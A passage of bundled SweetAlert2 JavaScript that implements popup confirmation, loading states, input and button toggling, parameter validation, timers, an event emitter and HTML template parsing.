   */ const confirm = (instance, value)=>{
        const innerParams = privateProps.innerParams.get(instance || undefined);
        if (innerParams.showLoaderOnConfirm) showLoading();
        if (innerParams.preConfirm) {
            instance.resetValidationMessage();
            instance.isAwaitingPromise = true; // Flagging the instance as awaiting a promise so it's own promise's reject/resolve methods doesn't get destroyed until the result from this preConfirm's promise is received
            const preConfirmPromise = Promise.resolve().then(()=>asPromise(innerParams.preConfirm(value, innerParams.validationMessage)));
            preConfirmPromise.then((preConfirmValue)=>{
                if (isVisible$1(getValidationMessage()) || preConfirmValue === false) {
                    instance.hideLoading();
                    handleAwaitingPromise(instance);
                } else succeedWith(instance, typeof preConfirmValue === "undefined" ? value : preConfirmValue);
            }).catch((error)=>rejectWith(instance || undefined, error));
        } else succeedWith(instance, value);
    };
    /**
   * Hides loader and shows back the button which was hidden by .showLoading()
   */ function hideLoading() {
        // do nothing if popup is closed
        const innerParams = privateProps.innerParams.get(this);
        if (!innerParams) return;
        const domCache = privateProps.domCache.get(this);
        hide(domCache.loader);
        if (isToast()) {
            if (innerParams.icon) show(getIcon());
        } else showRelatedButton(domCache);
        removeClass([
            domCache.popup,
            domCache.actions
        ], swalClasses.loading);
        domCache.popup.removeAttribute("aria-busy");
        domCache.popup.removeAttribute("data-loading");
        domCache.confirmButton.disabled = false;
        domCache.denyButton.disabled = false;
        domCache.cancelButton.disabled = false;
    }
    const showRelatedButton = (domCache)=>{
        const buttonToReplace = domCache.popup.getElementsByClassName(domCache.loader.getAttribute("data-button-to-replace"));
        if (buttonToReplace.length) show(buttonToReplace[0], "inline-block");
        else if (allButtonsAreHidden()) hide(domCache.actions);
    };
    /**
   * Gets the input DOM node, this method works with input parameter.
   *
   * @returns {HTMLInputElement | null}
   */ function getInput() {
        const innerParams = privateProps.innerParams.get(this);
        const domCache = privateProps.domCache.get(this);
        if (!domCache) return null;
        return getInput$1(domCache.popup, innerParams.input);
    }
    /**
   * @param {SweetAlert} instance
   * @param {string[]} buttons
   * @param {boolean} disabled
   */ function setButtonsDisabled(instance, buttons, disabled) {
        const domCache = privateProps.domCache.get(instance);
        buttons.forEach((button)=>{
            domCache[button].disabled = disabled;
        });
    }
    /**
   * @param {HTMLInputElement | null} input
   * @param {boolean} disabled
   */ function setInputDisabled(input, disabled) {
        const popup = getPopup();
        if (!popup || !input) return;
        if (input.type === "radio") {
            /** @type {NodeListOf<HTMLInputElement>} */ const radios = popup.querySelectorAll(`[name="${swalClasses.radio}"]`);
            for(let i = 0; i < radios.length; i++)radios[i].disabled = disabled;
        } else input.disabled = disabled;
    }
    /**
   * Enable all the buttons
   * @this {SweetAlert}
   */ function enableButtons() {
        setButtonsDisabled(this, [
            "confirmButton",
            "denyButton",
            "cancelButton"
        ], false);
    }
    /**
   * Disable all the buttons
   * @this {SweetAlert}
   */ function disableButtons() {
        setButtonsDisabled(this, [
            "confirmButton",
            "denyButton",
            "cancelButton"
        ], true);
    }
    /**
   * Enable the input field
   * @this {SweetAlert}
   */ function enableInput() {
        setInputDisabled(this.getInput(), false);
    }
    /**
   * Disable the input field
   * @this {SweetAlert}
   */ function disableInput() {
        setInputDisabled(this.getInput(), true);
    }
    /**
   * Show block with validation message
   *
   * @param {string} error
   * @this {SweetAlert}
   */ function showValidationMessage(error) {
        const domCache = privateProps.domCache.get(this);
        const params = privateProps.innerParams.get(this);
        setInnerHtml(domCache.validationMessage, error);
        domCache.validationMessage.className = swalClasses["validation-message"];
        if (params.customClass && params.customClass.validationMessage) addClass(domCache.validationMessage, params.customClass.validationMessage);
        show(domCache.validationMessage);
        const input = this.getInput();
        if (input) {
            input.setAttribute("aria-invalid", "true");
            input.setAttribute("aria-describedby", swalClasses["validation-message"]);
            focusInput(input);
            addClass(input, swalClasses.inputerror);
        }
    }
    /**
   * Hide block with validation message
   *
   * @this {SweetAlert}
   */ function resetValidationMessage() {
        const domCache = privateProps.domCache.get(this);
        if (domCache.validationMessage) hide(domCache.validationMessage);
        const input = this.getInput();
        if (input) {
            input.removeAttribute("aria-invalid");
            input.removeAttribute("aria-describedby");
            removeClass(input, swalClasses.inputerror);
        }
    }
    const defaultParams = {
        title: "",
        titleText: "",
        text: "",
        html: "",
        footer: "",
        icon: undefined,
        iconColor: undefined,
        iconHtml: undefined,
        template: undefined,
        toast: false,
        animation: true,
        showClass: {
            popup: "swal2-show",
            backdrop: "swal2-backdrop-show",
            icon: "swal2-icon-show"
        },
        hideClass: {
            popup: "swal2-hide",
            backdrop: "swal2-backdrop-hide",
            icon: "swal2-icon-hide"
        },
        customClass: {},
        target: "body",
        color: undefined,
        backdrop: true,
        heightAuto: true,
        allowOutsideClick: true,
        allowEscapeKey: true,
        allowEnterKey: true,
        stopKeydownPropagation: true,
        keydownListenerCapture: false,
        showConfirmButton: true,
        showDenyButton: false,
        showCancelButton: false,
        preConfirm: undefined,
        preDeny: undefined,
        confirmButtonText: "OK",
        confirmButtonAriaLabel: "",
        confirmButtonColor: undefined,
        denyButtonText: "No",
        denyButtonAriaLabel: "",
        denyButtonColor: undefined,
        cancelButtonText: "Cancel",
        cancelButtonAriaLabel: "",
        cancelButtonColor: undefined,
        buttonsStyling: true,
        reverseButtons: false,
        focusConfirm: true,
        focusDeny: false,
        focusCancel: false,
        returnFocus: true,
        showCloseButton: false,
        closeButtonHtml: "&times;",
        closeButtonAriaLabel: "Close this dialog",
        loaderHtml: "",
        showLoaderOnConfirm: false,
        showLoaderOnDeny: false,
        imageUrl: undefined,
        imageWidth: undefined,
        imageHeight: undefined,
        imageAlt: "",
        timer: undefined,
        timerProgressBar: false,
        width: undefined,
        padding: undefined,
        background: undefined,
        input: undefined,
        inputPlaceholder: "",
        inputLabel: "",
        inputValue: "",
        inputOptions: {},
        inputAutoFocus: true,
        inputAutoTrim: true,
        inputAttributes: {},
        inputValidator: undefined,
        returnInputValueOnDeny: false,
        validationMessage: undefined,
        grow: false,
        position: "center",
        progressSteps: [],
        currentProgressStep: undefined,
        progressStepsDistance: undefined,
        willOpen: undefined,
        didOpen: undefined,
        didRender: undefined,
        willClose: undefined,
        didClose: undefined,
        didDestroy: undefined,
        scrollbarPadding: true
    };
    const updatableParams = [
        "allowEscapeKey",
        "allowOutsideClick",
        "background",
        "buttonsStyling",
        "cancelButtonAriaLabel",
        "cancelButtonColor",
        "cancelButtonText",
        "closeButtonAriaLabel",
        "closeButtonHtml",
        "color",
        "confirmButtonAriaLabel",
        "confirmButtonColor",
        "confirmButtonText",
        "currentProgressStep",
        "customClass",
        "denyButtonAriaLabel",
        "denyButtonColor",
        "denyButtonText",
        "didClose",
        "didDestroy",
        "footer",
        "hideClass",
        "html",
        "icon",
        "iconColor",
        "iconHtml",
        "imageAlt",
        "imageHeight",
        "imageUrl",
        "imageWidth",
        "preConfirm",
        "preDeny",
        "progressSteps",
        "returnFocus",
        "reverseButtons",
        "showCancelButton",
        "showCloseButton",
        "showConfirmButton",
        "showDenyButton",
        "text",
        "title",
        "titleText",
        "willClose"
    ];
    /** @type {Record<string, string | undefined>} */ const deprecatedParams = {
        allowEnterKey: undefined
    };
    const toastIncompatibleParams = [
        "allowOutsideClick",
        "allowEnterKey",
        "backdrop",
        "focusConfirm",
        "focusDeny",
        "focusCancel",
        "returnFocus",
        "heightAuto",
        "keydownListenerCapture"
    ];
    /**
   * Is valid parameter
   *
   * @param {string} paramName
   * @returns {boolean}
   */ const isValidParameter = (paramName)=>{
        return Object.prototype.hasOwnProperty.call(defaultParams, paramName);
    };
    /**
   * Is valid parameter for Swal.update() method
   *
   * @param {string} paramName
   * @returns {boolean}
   */ const isUpdatableParameter = (paramName)=>{
        return updatableParams.indexOf(paramName) !== -1;
    };
    /**
   * Is deprecated parameter
   *
   * @param {string} paramName
   * @returns {string | undefined}
   */ const isDeprecatedParameter = (paramName)=>{
        return deprecatedParams[paramName];
    };
    /**
   * @param {string} param
   */ const checkIfParamIsValid = (param)=>{
        if (!isValidParameter(param)) warn(`Unknown parameter "${param}"`);
    };
    /**
   * @param {string} param
   */ const checkIfToastParamIsValid = (param)=>{
        if (toastIncompatibleParams.includes(param)) warn(`The parameter "${param}" is incompatible with toasts`);
    };
    /**
   * @param {string} param
   */ const checkIfParamIsDeprecated = (param)=>{
        const isDeprecated = isDeprecatedParameter(param);
        if (isDeprecated) warnAboutDeprecation(param, isDeprecated);
    };
    /**
   * Show relevant warnings for given params
   *
   * @param {SweetAlertOptions} params
   */ const showWarningsForParams = (params)=>{
        if (params.backdrop === false && params.allowOutsideClick) warn('"allowOutsideClick" parameter requires `backdrop` parameter to be set to `true`');
        for(const param in params){
            checkIfParamIsValid(param);
            if (params.toast) checkIfToastParamIsValid(param);
            checkIfParamIsDeprecated(param);
        }
    };
    /**
   * Updates popup parameters.
   *
   * @param {SweetAlertOptions} params
   */ function update(params) {
        const popup = getPopup();
        const innerParams = privateProps.innerParams.get(this);
        if (!popup || hasClass(popup, innerParams.hideClass.popup)) {
            warn(`You're trying to update the closed or closing popup, that won't work. Use the update() method in preConfirm parameter or show a new popup.`);
            return;
        }
        const validUpdatableParams = filterValidParams(params);
        const updatedParams = Object.assign({}, innerParams, validUpdatableParams);
        render(this, updatedParams);
        privateProps.innerParams.set(this, updatedParams);
        Object.defineProperties(this, {
            params: {
                value: Object.assign({}, this.params, params),
                writable: false,
                enumerable: true
            }
        });
    }
    /**
   * @param {SweetAlertOptions} params
   * @returns {SweetAlertOptions}
   */ const filterValidParams = (params)=>{
        const validUpdatableParams = {};
        Object.keys(params).forEach((param)=>{
            if (isUpdatableParameter(param)) validUpdatableParams[param] = params[param];
            else warn(`Invalid parameter to update: ${param}`);
        });
        return validUpdatableParams;
    };
    /**
   * Dispose the current SweetAlert2 instance
   */ function _destroy() {
        const domCache = privateProps.domCache.get(this);
        const innerParams = privateProps.innerParams.get(this);
        if (!innerParams) {
            disposeWeakMaps(this); // The WeakMaps might have been partly destroyed, we must recall it to dispose any remaining WeakMaps #2335
            return; // This instance has already been destroyed
        }
        // Check if there is another Swal closing
        if (domCache.popup && globalState.swalCloseEventFinishedCallback) {
            globalState.swalCloseEventFinishedCallback();
            delete globalState.swalCloseEventFinishedCallback;
        }
        if (typeof innerParams.didDestroy === "function") innerParams.didDestroy();
        globalState.eventEmitter.emit("didDestroy");
        disposeSwal(this);
    }
    /**
   * @param {SweetAlert} instance
   */ const disposeSwal = (instance)=>{
        disposeWeakMaps(instance);
        // Unset this.params so GC will dispose it (#1569)
        delete instance.params;
        // Unset globalState props so GC will dispose globalState (#1569)
        delete globalState.keydownHandler;
        delete globalState.keydownTarget;
        // Unset currentInstance
        delete globalState.currentInstance;
    };
    /**
   * @param {SweetAlert} instance
   */ const disposeWeakMaps = (instance)=>{
        // If the current instance is awaiting a promise result, we keep the privateMethods to call them once the promise result is retrieved #2335
        if (instance.isAwaitingPromise) {
            unsetWeakMaps(privateProps, instance);
            instance.isAwaitingPromise = true;
        } else {
            unsetWeakMaps(privateMethods, instance);
            unsetWeakMaps(privateProps, instance);
            delete instance.isAwaitingPromise;
            // Unset instance methods
            delete instance.disableButtons;
            delete instance.enableButtons;
            delete instance.getInput;
            delete instance.disableInput;
            delete instance.enableInput;
            delete instance.hideLoading;
            delete instance.disableLoading;
            delete instance.showValidationMessage;
            delete instance.resetValidationMessage;
            delete instance.close;
            delete instance.closePopup;
            delete instance.closeModal;
            delete instance.closeToast;
            delete instance.rejectPromise;
            delete instance.update;
            delete instance._destroy;
        }
    };
    /**
   * @param {object} obj
   * @param {SweetAlert} instance
   */ const unsetWeakMaps = (obj, instance)=>{
        for(const i in obj)obj[i].delete(instance);
    };
    var instanceMethods = /*#__PURE__*/ Object.freeze({
        __proto__: null,
        _destroy: _destroy,
        close: close,
        closeModal: close,
        closePopup: close,
        closeToast: close,
        disableButtons: disableButtons,
        disableInput: disableInput,
        disableLoading: hideLoading,
        enableButtons: enableButtons,
        enableInput: enableInput,
        getInput: getInput,
        handleAwaitingPromise: handleAwaitingPromise,
        hideLoading: hideLoading,
        rejectPromise: rejectPromise,
        resetValidationMessage: resetValidationMessage,
        showValidationMessage: showValidationMessage,
        update: update
    });
    /**
   * @param {SweetAlertOptions} innerParams
   * @param {DomCache} domCache
   * @param {Function} dismissWith
   */ const handlePopupClick = (innerParams, domCache, dismissWith)=>{
        if (innerParams.toast) handleToastClick(innerParams, domCache, dismissWith);
        else {
            // Ignore click events that had mousedown on the popup but mouseup on the container
            // This can happen when the user drags a slider
            handleModalMousedown(domCache);
            // Ignore click events that had mousedown on the container but mouseup on the popup
            handleContainerMousedown(domCache);
            handleModalClick(innerParams, domCache, dismissWith);
        }
    };
    /**
   * @param {SweetAlertOptions} innerParams
   * @param {DomCache} domCache
   * @param {Function} dismissWith
   */ const handleToastClick = (innerParams, domCache, dismissWith)=>{
        // Closing toast by internal click
        domCache.popup.onclick = ()=>{
            if (innerParams && (isAnyButtonShown(innerParams) || innerParams.timer || innerParams.input)) return;
            dismissWith(DismissReason.close);
        };
    };
    /**
   * @param {SweetAlertOptions} innerParams
   * @returns {boolean}
   */ const isAnyButtonShown = (innerParams)=>{
        return !!(innerParams.showConfirmButton || innerParams.showDenyButton || innerParams.showCancelButton || innerParams.showCloseButton);
    };
    let ignoreOutsideClick = false;
    /**
   * @param {DomCache} domCache
   */ const handleModalMousedown = (domCache)=>{
        domCache.popup.onmousedown = ()=>{
            domCache.container.onmouseup = function(e) {
                domCache.container.onmouseup = ()=>{};
                // We only check if the mouseup target is the container because usually it doesn't
                // have any other direct children aside of the popup
                if (e.target === domCache.container) ignoreOutsideClick = true;
            };
        };
    };
    /**
   * @param {DomCache} domCache
   */ const handleContainerMousedown = (domCache)=>{
        domCache.container.onmousedown = (e)=>{
            // prevent the modal text from being selected on double click on the container (allowOutsideClick: false)
            if (e.target === domCache.container) e.preventDefault();
            domCache.popup.onmouseup = function(e) {
                domCache.popup.onmouseup = ()=>{};
                // We also need to check if the mouseup target is a child of the popup
                if (e.target === domCache.popup || e.target instanceof HTMLElement && domCache.popup.contains(e.target)) ignoreOutsideClick = true;
            };
        };
    };
    /**
   * @param {SweetAlertOptions} innerParams
   * @param {DomCache} domCache
   * @param {Function} dismissWith
   */ const handleModalClick = (innerParams, domCache, dismissWith)=>{
        domCache.container.onclick = (e)=>{
            if (ignoreOutsideClick) {
                ignoreOutsideClick = false;
                return;
            }
            if (e.target === domCache.container && callIfFunction(innerParams.allowOutsideClick)) dismissWith(DismissReason.backdrop);
        };
    };
    const isJqueryElement = (elem)=>typeof elem === "object" && elem.jquery;
    const isElement = (elem)=>elem instanceof Element || isJqueryElement(elem);
    const argsToParams = (args)=>{
        const params = {};
        if (typeof args[0] === "object" && !isElement(args[0])) Object.assign(params, args[0]);
        else [
            "title",
            "html",
            "icon"
        ].forEach((name, index)=>{
            const arg = args[index];
            if (typeof arg === "string" || isElement(arg)) params[name] = arg;
            else if (arg !== undefined) error(`Unexpected type of ${name}! Expected "string" or "Element", got ${typeof arg}`);
        });
        return params;
    };
    /**
   * Main method to create a new SweetAlert2 popup
   *
   * @param  {...SweetAlertOptions} args
   * @returns {Promise<SweetAlertResult>}
   */ function fire() {
        for(var _len = arguments.length, args = new Array(_len), _key = 0; _key < _len; _key++)args[_key] = arguments[_key];
        return new this(...args);
    }
    /**
   * Returns an extended version of `Swal` containing `params` as defaults.
   * Useful for reusing Swal configuration.
   *
   * For example:
   *
   * Before:
   * const textPromptOptions = { input: 'text', showCancelButton: true }
   * const {value: firstName} = await Swal.fire({ ...textPromptOptions, title: 'What is your first name?' })
   * const {value: lastName} = await Swal.fire({ ...textPromptOptions, title: 'What is your last name?' })
   *
   * After:
   * const TextPrompt = Swal.mixin({ input: 'text', showCancelButton: true })
   * const {value: firstName} = await TextPrompt('What is your first name?')
   * const {value: lastName} = await TextPrompt('What is your last name?')
   *
   * @param {SweetAlertOptions} mixinParams
   * @returns {SweetAlert}
   */ function mixin(mixinParams) {
        class MixinSwal extends this {
            _main(params, priorityMixinParams) {
                return super._main(params, Object.assign({}, mixinParams, priorityMixinParams));
            }
        }
        // @ts-ignore
        return MixinSwal;
    }
    /**
   * If `timer` parameter is set, returns number of milliseconds of timer remained.
   * Otherwise, returns undefined.
   *
   * @returns {number | undefined}
   */ const getTimerLeft = ()=>{
        return globalState.timeout && globalState.timeout.getTimerLeft();
    };
    /**
   * Stop timer. Returns number of milliseconds of timer remained.
   * If `timer` parameter isn't set, returns undefined.
   *
   * @returns {number | undefined}
   */ const stopTimer = ()=>{
        if (globalState.timeout) {
            stopTimerProgressBar();
            return globalState.timeout.stop();
        }
    };
    /**
   * Resume timer. Returns number of milliseconds of timer remained.
   * If `timer` parameter isn't set, returns undefined.
   *
   * @returns {number | undefined}
   */ const resumeTimer = ()=>{
        if (globalState.timeout) {
            const remaining = globalState.timeout.start();
            animateTimerProgressBar(remaining);
            return remaining;
        }
    };
    /**
   * Resume timer. Returns number of milliseconds of timer remained.
   * If `timer` parameter isn't set, returns undefined.
   *
   * @returns {number | undefined}
   */ const toggleTimer = ()=>{
        const timer = globalState.timeout;
        return timer && (timer.running ? stopTimer() : resumeTimer());
    };
    /**
   * Increase timer. Returns number of milliseconds of an updated timer.
   * If `timer` parameter isn't set, returns undefined.
   *
   * @param {number} ms
   * @returns {number | undefined}
   */ const increaseTimer = (ms)=>{
        if (globalState.timeout) {
            const remaining = globalState.timeout.increase(ms);
            animateTimerProgressBar(remaining, true);
            return remaining;
        }
    };
    /**
   * Check if timer is running. Returns true if timer is running
   * or false if timer is paused or stopped.
   * If `timer` parameter isn't set, returns undefined
   *
   * @returns {boolean}
   */ const isTimerRunning = ()=>{
        return !!(globalState.timeout && globalState.timeout.isRunning());
    };
    let bodyClickListenerAdded = false;
    const clickHandlers = {};
    /**
   * @param {string} attr
   */ function bindClickHandler() {
        let attr = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : "data-swal-template";
        clickHandlers[attr] = this;
        if (!bodyClickListenerAdded) {
            document.body.addEventListener("click", bodyClickListener);
            bodyClickListenerAdded = true;
        }
    }
    const bodyClickListener = (event)=>{
        for(let el = event.target; el && el !== document; el = el.parentNode)for(const attr in clickHandlers){
            const template = el.getAttribute(attr);
            if (template) {
                clickHandlers[attr].fire({
                    template
                });
                return;
            }
        }
    };
    // Source: https://gist.github.com/mudge/5830382?permalink_comment_id=2691957#gistcomment-2691957
    class EventEmitter {
        constructor(){
            /** @type {Events} */ this.events = {};
        }
        /**
     * @param {string} eventName
     * @returns {EventHandlers}
     */ _getHandlersByEventName(eventName) {
            if (typeof this.events[eventName] === "undefined") // not Set because we need to keep the FIFO order
            // https://github.com/sweetalert2/sweetalert2/pull/2763#discussion_r1748990334
            this.events[eventName] = [];
            return this.events[eventName];
        }
        /**
     * @param {string} eventName
     * @param {EventHandler} eventHandler
     */ on(eventName, eventHandler) {
            const currentHandlers = this._getHandlersByEventName(eventName);
            if (!currentHandlers.includes(eventHandler)) currentHandlers.push(eventHandler);
        }
        /**
     * @param {string} eventName
     * @param {EventHandler} eventHandler
     */ once(eventName, eventHandler) {
            var _this = this;
            /**
       * @param {Array} args
       */ const onceFn = function() {
                _this.removeListener(eventName, onceFn);
                for(var _len = arguments.length, args = new Array(_len), _key = 0; _key < _len; _key++)args[_key] = arguments[_key];
                eventHandler.apply(_this, args);
            };
            this.on(eventName, onceFn);
        }
        /**
     * @param {string} eventName
     * @param {Array} args
     */ emit(eventName) {
            for(var _len2 = arguments.length, args = new Array(_len2 > 1 ? _len2 - 1 : 0), _key2 = 1; _key2 < _len2; _key2++)args[_key2 - 1] = arguments[_key2];
            this._getHandlersByEventName(eventName).forEach(/**
       * @param {EventHandler} eventHandler
       */ (eventHandler)=>{
                try {
                    eventHandler.apply(this, args);
                } catch (error) {
                    console.error(error);
                }
            });
        }
        /**
     * @param {string} eventName
     * @param {EventHandler} eventHandler
     */ removeListener(eventName, eventHandler) {
            const currentHandlers = this._getHandlersByEventName(eventName);
            const index = currentHandlers.indexOf(eventHandler);
            if (index > -1) currentHandlers.splice(index, 1);
        }
        /**
     * @param {string} eventName
     */ removeAllListeners(eventName) {
            if (this.events[eventName] !== undefined) // https://github.com/sweetalert2/sweetalert2/pull/2763#discussion_r1749239222
            this.events[eventName].length = 0;
        }
        reset() {
            this.events = {};
        }
    }
    globalState.eventEmitter = new EventEmitter();
    /**
   * @param {string} eventName
   * @param {EventHandler} eventHandler
   */ const on = (eventName, eventHandler)=>{
        globalState.eventEmitter.on(eventName, eventHandler);
    };
    /**
   * @param {string} eventName
   * @param {EventHandler} eventHandler
   */ const once = (eventName, eventHandler)=>{
        globalState.eventEmitter.once(eventName, eventHandler);
    };
    /**
   * @param {string} [eventName]
   * @param {EventHandler} [eventHandler]
   */ const off = (eventName, eventHandler)=>{
        // Remove all handlers for all events
        if (!eventName) {
            globalState.eventEmitter.reset();
            return;
        }
        if (eventHandler) // Remove a specific handler
        globalState.eventEmitter.removeListener(eventName, eventHandler);
        else // Remove all handlers for a specific event
        globalState.eventEmitter.removeAllListeners(eventName);
    };
    var staticMethods = /*#__PURE__*/ Object.freeze({
        __proto__: null,
        argsToParams: argsToParams,
        bindClickHandler: bindClickHandler,
        clickCancel: clickCancel,
        clickConfirm: clickConfirm,
        clickDeny: clickDeny,
        enableLoading: showLoading,
        fire: fire,
        getActions: getActions,
        getCancelButton: getCancelButton,
        getCloseButton: getCloseButton,
        getConfirmButton: getConfirmButton,
        getContainer: getContainer,
        getDenyButton: getDenyButton,
        getFocusableElements: getFocusableElements,
        getFooter: getFooter,
        getHtmlContainer: getHtmlContainer,
        getIcon: getIcon,
        getIconContent: getIconContent,
        getImage: getImage,
        getInputLabel: getInputLabel,
        getLoader: getLoader,
        getPopup: getPopup,
        getProgressSteps: getProgressSteps,
        getTimerLeft: getTimerLeft,
        getTimerProgressBar: getTimerProgressBar,
        getTitle: getTitle,
        getValidationMessage: getValidationMessage,
        increaseTimer: increaseTimer,
        isDeprecatedParameter: isDeprecatedParameter,
        isLoading: isLoading,
        isTimerRunning: isTimerRunning,
        isUpdatableParameter: isUpdatableParameter,
        isValidParameter: isValidParameter,
        isVisible: isVisible,
        mixin: mixin,
        off: off,
        on: on,
        once: once,
        resumeTimer: resumeTimer,
        showLoading: showLoading,
        stopTimer: stopTimer,
        toggleTimer: toggleTimer
    });
    class Timer {
        /**
     * @param {Function} callback
     * @param {number} delay
     */ constructor(callback, delay){
            this.callback = callback;
            this.remaining = delay;
            this.running = false;
            this.start();
        }
        /**
     * @returns {number}
     */ start() {
            if (!this.running) {
                this.running = true;
                this.started = new Date();
                this.id = setTimeout(this.callback, this.remaining);
            }
            return this.remaining;
        }
        /**
     * @returns {number}
     */ stop() {
            if (this.started && this.running) {
                this.running = false;
                clearTimeout(this.id);
                this.remaining -= new Date().getTime() - this.started.getTime();
            }
            return this.remaining;
        }
        /**
     * @param {number} n
     * @returns {number}
     */ increase(n) {
            const running = this.running;
            if (running) this.stop();
            this.remaining += n;
            if (running) this.start();
            return this.remaining;
        }
        /**
     * @returns {number}
     */ getTimerLeft() {
            if (this.running) {
                this.stop();
                this.start();
            }
            return this.remaining;
        }
        /**
     * @returns {boolean}
     */ isRunning() {
            return this.running;
        }
    }
    const swalStringParams = [
        "swal-title",
        "swal-html",
        "swal-footer"
    ];
    /**
   * @param {SweetAlertOptions} params
   * @returns {SweetAlertOptions}
   */ const getTemplateParams = (params)=>{
        const template = typeof params.template === "string" ? /** @type {HTMLTemplateElement} */ document.querySelector(params.template) : params.template;
        if (!template) return {};
        /** @type {DocumentFragment} */ const templateContent = template.content;
        showWarningsForElements(templateContent);
        const result = Object.assign(getSwalParams(templateContent), getSwalFunctionParams(templateContent), getSwalButtons(templateContent), getSwalImage(templateContent), getSwalIcon(templateContent), getSwalInput(templateContent), getSwalStringParams(templateContent, swalStringParams));
        return result;
    };
    /**
   * @param {DocumentFragment} templateContent
   * @returns {Record<string, any>}
   */ const getSwalParams = (templateContent)=>{
        /** @type {Record<string, any>} */ const result = {};
        /** @type {HTMLElement[]} */ const swalParams = Array.from(templateContent.querySelectorAll("swal-param"));
        swalParams.forEach((param)=>{
            showWarningsForAttributes(param, [
                "name",
                "value"
            ]);
            const paramName = /** @type {keyof SweetAlertOptions} */ param.getAttribute("name");
            const value = param.getAttribute("value");
            if (!paramName || !value) return;
            if (typeof defaultParams[paramName] === "boolean") result[paramName] = value !== "false";
            else if (typeof defaultParams[paramName] === "object") result[paramName] = JSON.parse(value);
            else result[paramName] = value;
        });
        return result;
    };
    /**
   * @param {DocumentFragment} templateContent
   * @returns {Record<string, any>}
   */ const getSwalFunctionParams = (templateContent)=>{
        /** @type {Record<string, any>} */ const result = {};
        /** @type {HTMLElement[]} */ const swalFunctions = Array.from(templateContent.querySelectorAll("swal-function-param"));
        swalFunctions.forEach((param)=>{
            const paramName = /** @type {keyof SweetAlertOptions} */ param.getAttribute("name");
            const value = param.getAttribute("value");
            if (!paramName || !value) return;
            result[paramName] = new Function(`return ${value}`)();
        });
        return result;
    };
    /**
   * @param {DocumentFragment} templateContent
   * @returns {Record<string, any>}
   */ const getSwalButtons = (templateContent)=>{
        /** @type {Record<string, any>} */ const result = {};
        /** @type {HTMLElement[]} */ const swalButtons = Array.from(templateContent.querySelectorAll("swal-button"));
        swalButtons.forEach((button)=>{
            showWarningsForAttributes(button, [
                "type",
                "color",
                "aria-label"
            ]);
            const type = button.getAttribute("type");
            if (!type || ![
                "confirm",
                "cancel",
                "deny"
            ].includes(type)) return;
            result[`${type}ButtonText`] = button.innerHTML;
            result[`show${capitalizeFirstLetter(type)}Button`] = true;
            if (button.hasAttribute("color")) result[`${type}ButtonColor`] = button.getAttribute("color");
            if (button.hasAttribute("aria-label")) result[`${type}ButtonAriaLabel`] = button.getAttribute("aria-label");
        });
        return result;
    };
    /**
   * @param {DocumentFragment} templateContent
   * @returns {Pick<SweetAlertOptions, 'imageUrl' | 'imageWidth' | 'imageHeight' | 'imageAlt'>}
   */ const getSwalImage = (templateContent)=>{
        const result = {};
        /** @type {HTMLElement | null} */ const image = templateContent.querySelector("swal-image");
        if (image) {
            showWarningsForAttributes(image, [
                "src",
                "width",
                "height",
                "alt"
            ]);
            if (image.hasAttribute("src")) result.imageUrl = image.getAttribute("src") || undefined;
            if (image.hasAttribute("width")) result.imageWidth = image.getAttribute("width") || undefined;
            if (image.hasAttribute("height")) result.imageHeight = image.getAttribute("height") || undefined;
            if (image.hasAttribute("alt")) result.imageAlt = image.getAttribute("alt") || undefined;
        }
        return result;
    };
    /**
   * @param {DocumentFragment} templateContent
   * @returns {Record<string, any>}
   */ const getSwalIcon = (templateContent)=>{
        const result = {};
        /** @type {HTMLElement | null} */ const icon = templateContent.querySelector("swal-icon");
        if (icon) {
            showWarningsForAttributes(icon, [
                "type",
                "color"
            ]);
            if (icon.hasAttribute("type")) result.icon = icon.getAttribute("type");
            if (icon.hasAttribute("color")) result.iconColor = icon.getAttribute("color");
            result.iconHtml = icon.innerHTML;
        }
        return result;
    };
    /**
   * @param {DocumentFragment} templateContent
   * @returns {Record<string, any>}
   */ const getSwalInput = (templateContent)=>{
        /** @type {Record<string, any>} */ const result = {};
        /** @type {HTMLElement | null} */ const input = templateContent.querySelector("swal-input");
        if (input) {
            showWarningsForAttributes(input, [
                "type",
                "label",
                "placeholder",
                "value"
            ]);
            result.input = input.getAttribute("type") || "text";
            if (input.hasAttribute("label")) result.inputLabel = input.getAttribute("label");
            if (input.hasAttribute("placeholder")) result.inputPlaceholder = input.getAttribute("placeholder");
            if (input.hasAttribute("value")) result.inputValue = input.getAttribute("value");
        }
        /** @type {HTMLElement[]} */ const inputOptions = Array.from(templateContent.querySelectorAll("swal-input-option"));
        if (inputOptions.length) {
            result.inputOptions = {};
            inputOptions.forEach((option)=>{
                showWarningsForAttributes(option, [
                    "value"
                ]);
                const optionValue = option.getAttribute("value");
                if (!optionValue) return;
                const optionName = option.innerHTML;
                result.inputOptions[optionValue] = optionName;
            });
        }
        return result;
    };
    /**
   * @param {DocumentFragment} templateContent
   * @param {string[]} paramNames
   * @returns {Record<string, any>}
   */ const getSwalStringParams = (templateContent, paramNames)=>{
        /** @type {Record<string, any>} */ const result = {};
        for(const i in paramNames){
            const paramName = paramNames[i];
            /** @type {HTMLElement | null} */ const tag = templateContent.querySelector(paramName);
            if (tag) {
                showWarningsForAttributes(tag, []);
                result[paramName.replace(/^swal-/, "")] = tag.innerHTML.trim();
            }
        }
        return result;
    };
    /**
   * @param {DocumentFragment} templateContent
   */ const showWarningsForElements = (templateContent)=>{
        const allowedElements = swalStringParams.concat([
            "swal-param",
            "swal-function-param",
            "swal-button",
            "swal-image",
            "swal-icon",
            "swal-input",
            "swal-input-option"
        ]);
        Array.from(templateContent.children).forEach((el)=>{
            const tagName = el.tagName.toLowerCase();
            if (!allowedElements.includes(tagName)) warn(`Unrecognized element <${tagName}>`);
        });
    };
    /**
   * @param {HTMLElement} el
   * @param {string[]} allowedAttributes
   */ const showWarningsForAttributes = (el, allowedAttributes)=>{
        Array.from(el.attributes).forEach((attribute)=>{
            if (allowedAttributes.indexOf(attribute.name) === -1) warn([
                `Unrecognized attribute "${attribute.name}" on <${el.tagName.toLowerCase()}>.`,
                `${allowedAttributes.length ? `Allowed attributes are: ${allowedAttributes.join(", ")}` : "To set the value, use HTML within the element."}`
            ]);
        });
    };
    const SHOW_CLASS_TIMEOUT = 10;
    /**
   * Open popup, add necessary classes and styles, fix scrollbar
   *
   * @param {SweetAlertOptions} params
   */ const openPopup = (params)=>{
        const container = getContainer();
        const popup = getPopup();
        if (typeof params.willOpen === "function") params.willOpen(popup);
        globalState.eventEmitter.emit("willOpen", popup);
        const bodyStyles = window.getComputedStyle(document.body);
        const initialBodyOverflow = bodyStyles.overflowY;
